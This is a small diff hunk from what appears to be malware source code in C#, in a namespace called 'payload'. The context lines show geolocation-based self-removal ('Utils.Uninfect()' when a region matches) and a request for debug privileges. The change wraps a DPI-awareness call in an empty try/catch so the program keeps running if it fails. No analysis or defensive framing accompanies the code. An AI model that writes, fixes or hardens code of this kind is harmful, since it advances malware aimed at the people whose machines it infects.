@@ -50,7 +50,7 @@ namespace payload
             if (args[2] != string.Empty) foreach (string item in args[2].Split(',')) geolock.Add(item.ToLower().Trim());
 
             if (Utils.Geocheck(geolock)) Utils.Uninfect();
-            SetProcessDPIAware();
+            try { SetProcessDPIAware(); } catch { }
             try { Process.EnterDebugMode(); } catch { }
 
             Threads tds = new Threads();
